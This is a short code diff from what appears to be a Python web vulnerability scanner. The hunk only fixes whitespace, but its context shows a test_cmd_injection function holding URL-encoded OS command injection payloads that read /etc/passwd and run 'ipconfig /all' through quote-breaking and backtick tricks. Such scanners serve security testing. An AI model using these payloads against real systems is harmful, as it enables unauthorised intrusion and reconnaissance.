@@ -28,7 +28,7 @@ def generate_random_alphanumeric():
 def test_cmd_injection(url, post):
     if(args.verbose):
         print(colors.blue("[i]") + " Testing results-based OS command injection...")
-    
+
     cmdList = []
     cmdList.append("1%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%27%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D%5C%22%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd%3B%23%24%7BIFS%7D")
     cmdList.append("1%26ipconfig%20%2Fall%26%60ipconfig%20%2Fall%60%26%5C%221%26ipconfig%20%2Fall%26%60ipconfig%20%2Fall%60%26")
